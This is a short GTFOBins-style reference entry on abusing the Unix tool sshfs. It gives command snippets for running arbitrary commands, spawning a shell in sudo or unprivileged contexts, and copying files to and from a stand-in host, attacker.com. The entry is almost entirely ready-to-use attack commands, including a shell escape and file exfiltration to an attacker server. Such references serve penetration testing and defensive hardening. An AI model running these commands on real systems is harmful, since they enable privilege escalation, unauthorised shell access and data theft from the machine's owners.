---
type: gtfobin
name: sshfs
platform: Unix
functions: [command, download, shell, upload]
tags: [gtfobin, unix, lotl]
---

# sshfs

## command

```bash
sshfs -o ssh_command=/path/to/command x: /path/to/dir/
```
**Contexts:** sudo, unprivileged

## download

```bash
sshfs user@attacker.com:/ /path/to/dir/
cp /path/to/dir/path/to/input-file /path/to/output-file
```
**Contexts:** unprivileged

## shell

```bash
echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file
chmod +x /path/to/temp-file
sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/
```
_The mount dir must be writable by the invoking user._
**Contexts:** sudo, unprivileged

## upload

```bash
sshfs user@attacker.com:/ /path/to/dir/
cp /path/to/input-file /path/to/dir/
```
**Contexts:** unprivileged
